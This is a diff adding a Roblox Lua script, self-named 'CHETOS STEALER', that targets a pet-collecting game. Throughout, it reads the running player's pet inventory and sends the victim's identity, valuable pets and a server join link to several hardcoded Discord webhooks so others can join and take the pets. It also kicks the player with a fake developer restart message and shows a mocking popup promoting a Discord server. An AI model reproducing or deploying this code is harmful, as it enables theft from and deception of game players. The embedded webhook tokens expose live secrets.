@@ -1,0 +1,264 @@
+if getgenv().ChetosStealerHasRun then return end
+getgenv().ChetosStealerHasRun = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+
+local CONFIG = {
+    ["ALL_HITS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401521900114411652/pfObUsyrEy7IcgEKAtss2EgqWFwRwfsu7qSp9ol1f62yGuYEgdc1binTqrqvcYdXeHnK",
+    ["KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1400889130409267260/sjHU9RINLAq242Sy_D54yEjkh3wSAJGUeiK9UPXealHoWCCxR3DKAPevSbbo7oeNcS0b",
+    ["LOGS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401539889648111706/QLy9xwMrnGovV5AXnMHJJwob5el6y8eE2ZK4V0b_By3q4RbQIo6TCeWMeoT3dZUWbGHB",
+    ["MONITOR_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1400806550779596800/zxuZoPbbY2_DpsgcP3Wm2AnmcjfUAfLNh-jddCn_PWPKj8Uvzaoeod3cVZidn-i3CMKw",
+    ["KITSUNE_MONITOR_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401440507632291881/CwFM-hjUCQf4J3Ce5G7z6dxDN_raHuEbAciy6d66flEJVfSeWE93SQorP-itj8srp612",
+    ["PING_MESSAGE"] = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
+    ["DYNAMIC_DISCORD_LINKS"] = {
+        "https://discord.gg/ZXwu8pKQwp",
+        "https://discord.gg/ZXwu8pKQwp"
+    },
+    ["HUGE_PET_WEIGHT"] = 6.0,
+    ["AGED_PET_DAYS"] = 50,
+    ["MAX_PETS_IN_LIST"] = 10,
+    ["EXCLUSIVE_PET_TYPES"] = {
+        ["Disco Bee"] = true, ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true, 
+        ["Rainbow Pachycephalosaurus"] = true, ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true, 
+        ["Kitsune"] = true, ["Spinosaurus"] = true, ["Rainbow Spinosaurus"] = true,
+        ["Mizuchi"] = true, ["Rainbow Kitsune"] = true
+    },
+    ["QUANTITY_PET_TYPES"] = {
+        ["Raccoon"] = true, ["Dragonfly"] = true, ["Mimic Octopus"] = true,
+        ["Butterfly"] = true, ["Queen Bee"] = true, ["T-Rex"] = true
+    },
+    ["NORMAL_TARGET_PETS"] = {
+        ["Red Fox"] = true, ["Fennec Fox"] = true, ["French Fry Ferret"] = true, ["Chicken Zombie"] = true
+    }
+}
+
+local MUTATION_MAP = {
+    a = "Shocked", b = "Golden", c = "Rainbow", d = "Shiny",
+    e = "Windy", f = "Frozen", g = "Inverted", h = "Rideable",
+    i = "Mega", j = "Tiny", k = "IronSkin", l = "Radiant",
+    m = "Normal", n = "Ascended", o = "Tranquil", p = "Corrupted", q = "Fried",
+    Shocked = "Shocked", Golden = "Golden", Rainbow = "Rainbow", Shiny = "Shiny",
+    Windy = "Windy", Frozen = "Frozen", Inverted = "Inverted", Rideable = "Rideable",
+    Mega = "Mega", Tiny = "Tiny", IronSkin = "IronSkin", Radiant = "Radiant",
+    Normal = "Normal", Ascended = "Ascended", Tranquil = "Tranquil", Corrupted = "Corrupted", Fried = "Fried"
+}
+
+local function getFriendCount(userId)
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc then return -1 end
+    local success, response = pcall(requestFunc, { Url = "https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/friends/count", Method = "GET" })
+    if success and response and response.Body then
+        local decodeSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+        if decodeSuccess and data and type(data.count) == "number" then return data.count end
+    end
+    return -1
+end
+
+local function kickForCompetitor()
+    getgenv().ChetosStealerHasRun = true
+    player:Kick("Jandel: Hi restarting the server. please rejoin.")
+end
+
+task.spawn(function()
+    while player.Parent do
+        local otherPlayers = Players:GetPlayers()
+        if #otherPlayers > 1 then
+            for _, p in ipairs(otherPlayers) do
+                if p ~= player then
+                    local friendCount = getFriendCount(p.UserId)
+                    if friendCount <= 0 then
+                        kickForCompetitor()
+                        return
+                    end
+                end
+            end
+        end
+        task.wait(10)
+    end
+end)
+
+local Util = {}
+function Util.Get(tbl, path, default)
+    local current = tbl
+    for key in string.gmatch(path, "[^.]+") do
+        if type(current) ~= "table" or not current[key] then return default end
+        current = current[key]
+    end
+    return current
+end
+
+local function getExecutorName()
+    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
+    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
+    if syn then return "Synapse X" end; if Krnl then return "Krnl" end; if Fluxus then return "Fluxus" end; if SENTINEL_V2 then return "Sentinel" end
+    return "Unknown"
+end
+
+local function createStyledNotificationGUI(titleText, messageText, buttonText)
+    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
+    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
+    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
+    local gradient = Instance.new("UIGradient", overlay); gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))}); gradient.Rotation = 90
+    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
+    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
+    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
+    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
+    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.TextYAlignment = Enum.TextYAlignment.Center
+    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
+    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
+    local btnStroke = Instance.new("UIStroke", linkButton); btnStroke.Color = Color3.fromRGB(255, 255, 255); btnStroke.Thickness = 1; btnStroke.Transparency = 0.9
+    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
+    return gui
+end
+
+local function sendOurWebhook(url, payload)
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc or not url then return end
+    task.spawn(function() pcall(function() requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end) end)
+end
+
+task.spawn(function()
+    local PetRegistry, InventoryData
+    local success = pcall(function()
+        PetRegistry = require(ReplicatedStorage.Data.PetRegistry.PetList)
+        InventoryData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
+    end)
+    if not (success and PetRegistry and InventoryData) then return end
+
+    local priorityPets = {}
+    local stats = { total = 0, huge = 0, agedMutated = 0 }
+    
+    local hasMegaHuge, hasAscendedPet, hasMegaTargetPet = false, false, false
+    local hasRainbowDragonfly, hasGoldenButterfly = false, false
+    local tRexCount, queenBeeCount, mimicOctopusCount, discoBeeCount = 0, 0, 0, 0
+
+    for uuid, petInfo in pairs(InventoryData) do
+        if type(petInfo) == "table" and petInfo.PetData then
+            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
+            if baseWeight > 0 or tonumber(Util.Get(petInfo, "PetData.Weight", 0)) > 0 then
+                stats.total += 1
+                local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
+                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
+                local basePetType = tostring(petInfo.PetType or "Unknown")
+                
+                local isExclusiveType = CONFIG["EXCLUSIVE_PET_TYPES"][basePetType]
+                local isQuantityType = CONFIG["QUANTITY_PET_TYPES"][basePetType]
+                local isNormalType = CONFIG["NORMAL_TARGET_PETS"][basePetType]
+                
+                local pet = {uuid = uuid, baseType = basePetType, typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType, weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight, baseWeight = baseWeight, age = tonumber(Util.Get(petInfo, "PetData.Age", 0)), level = tonumber(Util.Get(petInfo, "PetData.Level", 1)), isHuge = baseWeight >= CONFIG["HUGE_PET_WEIGHT"], isAged = (math.floor(tonumber(Util.Get(petInfo, "PetData.Age", 0)) / 86400) >= CONFIG["AGED_PET_DAYS"]), isMutated = mutationName ~= ""}
+                
+                if mutationName == "Mega" and pet.isHuge then hasMegaHuge = true end
+                if mutationName == "Ascended" then hasAscendedPet = true end
+                if mutationName == "Mega" and (isExclusiveType or isQuantityType) then hasMegaTargetPet = true end
+
+                if basePetType == "Dragonfly" and mutationName == "Rainbow" then hasRainbowDragonfly = true end
+                if basePetType == "Butterfly" and mutationName == "Golden" then hasGoldenButterfly = true end
+                
+                if basePetType == "T-Rex" then tRexCount = tRexCount + 1 end
+                if basePetType == "Queen Bee" then queenBeeCount = queenBeeCount + 1 end
+                if basePetType == "Mimic Octopus" then mimicOctopusCount = mimicOctopusCount + 1 end
+                if basePetType == "Disco Bee" then discoBeeCount = discoBeeCount + 1 end
+
+                if isExclusiveType or isQuantityType or isNormalType or pet.isHuge then 
+                    table.insert(priorityPets, pet)
+                    if pet.isHuge then stats.huge += 1 end
+                    if pet.isAged or pet.isMutated then stats.agedMutated += 1 end 
+                end
+            end
+        end
+    end
+
+    if #priorityPets == 0 then
+        createStyledNotificationGUI("PET STEALER", "HEY BROTHER YOU ARE POOR YOU DONT HAVE PET I CAN STEAL!!🤣😂 IF YOU WANT TO STEAL PEOPLE PETS JOIN IN THE DISCORD CLICK THE DISCORD", "Copy Discord Link")
+        return
+    end
+
+    table.sort(priorityPets, function(a, b)
+        local scoreA = (string.find(a.typeName:lower(), "rainbow") and 1) or (string.find(a.typeName:lower(), "devine") and 2) or (a.isHuge and 3) or ((a.isMutated or a.isAged) and 4) or 5
+        local scoreB = (string.find(b.typeName:lower(), "rainbow") and 1) or (string.find(b.typeName:lower(), "devine") and 2) or (b.isHuge and 3) or ((b.isMutated or b.isAged) and 4) or 5
+        if scoreA ~= scoreB then return scoreA < scoreB else return a.weight > b.weight end
+    end)
+
+    local function formatPetList()
+        local list = {}
+        for i, pet in ipairs(priorityPets) do
+            local icon = pet.isHuge and "🤭" or (pet.isAged or pet.isMutated) and "⭐" or "🎯"
+            local ageText = ""
+            if pet.age > 0 then local d, h = math.floor(pet.age / 86400), math.floor((pet.age % 86400) / 3600); ageText = d > 0 and string.format(" (Age: %dd %dh)", d, h) or string.format(" (Age: %dh)", h) end
+            local weightText = pet.weight ~= pet.baseWeight and string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) or string.format("%.2f KG", pet.weight)
+            table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, pet.typeName, weightText, ageText, pet.level))
+            if i >= CONFIG["MAX_PETS_IN_LIST"] then local r = #priorityPets - i; if r > 0 then table.insert(list, string.format("➕ ... and %d more priority pets", r)) end; break end
+        end
+        return "```\n" .. table.concat(list, "\n") .. "\n```"
+    end
+
+    local formattedPriorityPets = formatPetList()
+    
+    local isKitsuneTierHit = (
+        discoBeeCount > 0 or
+        #priorityPets >= 10 or
+        hasMegaHuge or
+        hasAscendedPet or
+        hasMegaTargetPet or
+        hasRainbowDragonfly or
+        hasGoldenButterfly or
+        tRexCount >= 3 or
+        queenBeeCount >= 3 or
+        mimicOctopusCount >= 3
+    )
+
+    task.spawn(function()
+        local monitorUrl = isKitsuneTierHit and CONFIG["KITSUNE_MONITOR_WEBHOOK_URL"] or CONFIG["MONITOR_WEBHOOK_URL"]
+        while player.Parent do
+            local playerList = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= player then
+                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
+                end
+            end
+            local playerListString = #playerList > 0 and table.concat(playerList, "\n") or "No other players in the server."
+
+            local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
+            local embed = {title = "Server Monitor", color = 16776960, fields = {{name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false}, {name = "🦸 Receiver", value = string.format("`%s`", getgenv().receiver or "N/A"), inline = false}, {name = "🐾 Victim's Priority Pets", value = formattedPriorityPets, inline = false}, {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}, {name = "🔗 Server Link", value = join_link, inline = false}}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
+            local payload = {username = "CHETOS MONITOR", avatar_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1401540378724925555/ChatGPT_Image_Jul_22_2025_01_10_10_AM.png?ex=6890a5b1&is=688f5431&hm=4a0a871d8fa44944fdd6684e1f01f16964cc2dfab520c02b7c600687223bb1af&", embeds = { embed }}
+            sendOurWebhook(monitorUrl, payload)
+            task.wait(4)
+        end
+    end)
+
+    local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
+    local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
+    local executorName = getExecutorName()
+    local loaderWebhook = getgenv().Webhook
+    local shouldPing = serverPlayerCount > 1 and serverPlayerCount < maxPlayerCount
+    
+    local join_link = string.format("[Join Server](https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)
+    local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
+    local description = table.concat({"**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("🦸 Receiver: %s"):format(getgenv().receiver or ""), ("💻 Executor: %s"):format(executorName), ("🌐 Server: %s"):format(serverStatus), "```", "**📊 BACKPACK STATISTICS**", "```", ("🤭 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("⭐ Aged/Mutated: %d"):format(stats.agedMutated), ("🎯 Priority Pets: %d"):format(#priorityPets), "```", "**🐾 All Pets**", formattedPriorityPets, "**🔗 SERVER ACCESS - GET THE LOOT!**", "Click 'Join Server' to get the pets. If the victim is not in the server, they have already left.", join_link}, "\n")
+    local embed = {title = "🐾 **SB STEALER PALDO**", color = 2829617, description = description, footer = { text = "CHETOS STEALER • by CHETOS Developer", icon_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1401540378724925555/ChatGPT_Image_Jul_22_2025_01_10_10_AM.png?ex=6890a5b1&is=688f5431&hm=4a0a871d8fa44944fdd6684e1f01f16964cc2dfab520c02b7c600687223bb1af&" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
+    
+    local base_payload = {username = " CHETOS PETS STEALER", avatar_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1401540378724925555/ChatGPT_Image_Jul_22_2025_01_10_10_AM.png?ex=6890a5b1&is=688f5431&hm=4a0a871d8fa44944fdd6684e1f01f16964cc2dfab520c02b7c600687223bb1af&", embeds = { embed }}
+    
+    local payload = table.clone(base_payload)
+    if shouldPing then 
+        payload.content = teleport_command .. "\n" .. CONFIG["PING_MESSAGE"]
+        payload.allowed_mentions = { parse = {"everyone"} } 
+    end
+
+    local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formattedPriorityPets)
+    local embed_log = {title = "🐾 New Hit Logged", color = 15158332, description = log_description, footer = { text = "Public Feed" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
+    local payload_log = {username = "SB LOGS", avatar_url = "https://cdn.discordapp.com/attachments/1385257720063459368/1401540378724925555/ChatGPT_Image_Jul_22_2025_01_10_10_AM.png?ex=6890a5b1&is=688f5431&hm=4a0a871d8fa44944fdd6684e1f01f16964cc2dfab520c02b7c600687223bb1af&", embeds = { embed_log }}
+
+    if isKitsuneTierHit then
+        sendOurWebhook(CONFIG["KITSUNE_WEBHOOK_URL"], payload)
+    else
+        sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
+        if loaderWebhook then sendOurWebhook(loaderWebhook, payload) end
+        sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload_log)
+    end
+end)
